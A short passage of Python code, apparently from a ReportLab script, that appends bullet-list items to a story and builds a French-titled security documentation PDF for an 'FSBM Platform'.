    story.append(Paragraph(f"• {x}", ST_LIST))

build_doc("08_Securite_Complet.pdf", story,
          "PDF 08 - Securite",
          "FSBM Platform - Securite Complete")
